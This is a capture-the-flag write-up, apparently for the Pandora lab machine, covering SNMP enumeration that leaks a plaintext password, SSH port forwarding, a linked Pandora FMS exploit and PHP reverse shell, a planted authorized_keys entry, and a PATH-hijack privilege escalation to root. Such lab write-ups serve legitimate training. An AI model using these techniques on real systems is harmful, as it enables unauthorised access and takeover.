# Enumeration
Using nmap enumeration:
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```
```
PORT    STATE SERVICE
161/udp open  snmp

```
There is a website on port :
![](attachment/9457ccc4fcad46b3ef953f9e2c878b6c.png)
Using gobuster found some directories but wasnt useful
Using snmpwalk walk to enumerate:
`snmpwalk -c public -v2c 10.10.11.136`
Found Credentials on snmpwalk:
![](attachment/2cf415ddb15dda623626fd3573b667ad.png)
daniel : HotelBabylon23
# Exploitation
Logging in using ssh found one more user matt in home directory.

Checking apache servers in `/etc/apache2/sites-available`:
pandora.conf
![](attachment/6fb80239754c882b332e5c13e1a070a8.png)
The port is on localhost so forwarding is needed.
Using ~ to give command in ssh and then type "C" to give additional arguments
`ssh daniel@10.10.11.136 -L 8000:127.0.0.1:80`
Visiting 127.0.0.1:8000![](attachment/28e7844ceb216305d69d2ad75df86921.png)

Using this [exploit](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/tree/master)
And uploading [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell)
Using linpeas
![](attachment/0d5f6bc3dd1f3d9b9b9da6d91e032c19.png)
Now analysing the file pandora_backup located at /usr/bin/pandora_backup
![](attachment/6d050742a93f467fc5562f5a6d41ac6e.png)Using ghidra we can see![](attachment/0dae855f17d3bdd40d2359f3c8e21029.png)
Now doing a path hijack

```
echo /bin/bash > tar

export PATH=/home/matt:$PATH

chmod +x tar

```
![](attachment/ba81078df96261572b00b38fc67bba6f.png)

This doesn't work due to an error with sudo![](attachment/b16bf8752ebe98e920ee1204b92ebd44.png)

It doesn't run from this shell so getting an ssh shell.
To get a ssh shell in matt:
- generate key pair with `ssh-keygen`
- drop public key into `/home/matt/.ssh/authorized_keys`
-  Give appropriate permissions
```
chmod 700 /home/matt/.ssh
chmod 600 /home/matt/.ssh/authorized_keys
```
- `ssh -i id_ed25519 matt@10.10.11.136` Login using ssh
Now `sudo -l` works with ssh:
![](attachment/3bba022f24f9bc5648054235e729b843.png)
Now  running pandora_backup we get root:
![](attachment/b9794c793cce227eb25dfb814fbcff68.png)
# Beyond Root
To trace back the process we did `echo $$` first and went back from there in `ps -ef`


SUID binaries failed to run due to the pandora.conf in apache2:
![](attachment/6070d5e7a81781f39c11d37bd381cb66.png)
It runs as user matt and group matt
The /etc/apache2/mods-enabled directory shows the various modules that are enabled, and mpm-itk is there (typically items in the *-enabled directories are symbolic links to items in the *-available directories):